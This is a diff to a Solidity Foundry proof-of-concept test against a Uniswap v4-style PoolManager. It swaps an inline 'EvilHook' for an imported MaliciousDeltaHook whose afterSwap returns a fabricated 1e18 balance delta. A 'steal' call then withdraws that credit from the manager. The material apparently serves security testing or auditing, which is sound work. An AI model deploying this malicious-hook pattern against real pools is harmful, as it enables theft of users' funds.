@@ -7,8 +7,8 @@ import {Currency} from "../src/types/Currency.sol";
 import {Hooks} from "../src/libraries/Hooks.sol";
 import {TickMath} from "../src/libraries/TickMath.sol";
 import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
-import {BalanceDelta, toBalanceDelta} from "../src/types/BalanceDelta.sol";
-import {IHooks} from "../src/interfaces/IHooks.sol";
+import {MaliciousDeltaHook} from "./mocks/MaliciousDeltaHook.sol";
+import {BalanceDelta} from "../src/types/BalanceDelta.sol";
 
 contract Token {
     mapping(address=>uint) public balanceOf;
@@ -18,23 +18,8 @@ contract Token {
     function approve(address,uint) external pure returns(bool){return true;}
 }
 
-contract EvilHook {
-    PoolManager public manager;
-    address public attacker;
-    Currency public currency1;
-    constructor(address m){manager=PoolManager(m);}
-    function setAttacker(address a) external {attacker=a;}
-    function setCurrency1(Currency c) external {currency1=c;}
-    function steal(Currency c, address to, uint128 amt) external {
-        manager.take(c, to, amt);
-    }
-    function afterSwap(address, PoolKey calldata, SwapParams calldata, BalanceDelta, bytes calldata) external pure returns (bytes4, BalanceDelta) {
-        return (IHooks.afterSwap.selector, toBalanceDelta(int128(int256(1e18)), int128(0)));
-    }
-}
-
 contract POC is Test {
-    PoolManager public manager; EvilHook public hook;
+    PoolManager public manager; MaliciousDeltaHook public hook;
     Token public token0; Token public token1; PoolKey public key;
     function setUp() public {
         Token t0=new Token(); Token t1=new Token();
@@ -43,12 +28,12 @@ contract POC is Test {
         manager=new PoolManager(address(this));
         uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
         address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
-        vm.etch(a, address(new EvilHook(address(manager))).code);
-        hook=EvilHook(a);
+        vm.etch(a, address(new MaliciousDeltaHook(manager)).code);
+        hook=MaliciousDeltaHook(a);
         vm.store(address(hook), bytes32(0), bytes32(uint256(uint160(address(manager)))));
         token0.mint(address(this),10000e18); token1.mint(address(this),10000e18);
         token0.mint(address(manager),10000e18); token1.mint(address(manager),10000e18);
-        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(address(hook)));
+        key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,hook);
         hook.setCurrency1(Currency.wrap(address(token1)));
         hook.setAttacker(address(this));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
@@ -68,9 +53,8 @@ contract POC is Test {
             else if(s.amount0()>0) manager.take(c0, address(this), uint128(s.amount0()));
             if(s.amount1()<0){manager.sync(c1); token1.mint(address(manager), uint128(-s.amount1())); manager.settle();}
             else if(s.amount1()>0) manager.take(c1, address(this), uint128(s.amount1()));
-            // steal hook's 1e18 as hook - no prank needed
-            try hook.steal(c0, address(this), 1e18) {} catch {}
-            try hook.steal(c1, address(this), 1e18) {} catch {}
+            // hook's 1e18 credit - take as hook (no vm.prank needed)
+            hook.steal(c0, address(this), 1e18);
         }
         return "";
     }
